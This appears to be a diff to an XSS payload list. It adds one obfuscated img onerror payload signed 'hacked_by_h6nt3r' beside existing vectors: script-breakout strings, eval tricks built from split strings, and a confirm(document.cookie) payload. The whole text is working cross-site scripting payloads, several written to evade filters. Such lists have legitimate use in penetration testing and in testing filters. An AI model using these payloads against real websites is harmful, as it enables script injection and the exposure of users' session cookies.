@@ -191,3 +191,4 @@ https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
 /* </script> &#x3c;img/src/ <script>window[/al/.source+/ert/.source](origin);</script> /> */
 a=eval,c=["a"],x=["lert"],t=\${c}${x}(origin)`,http://a.call`1${t}``
 <Img Src=OnXSS OnError=confirm(document.cookie)>
+<img//////src=x oNlY=1 oNerror=alert('hacked_by_h6nt3r')//
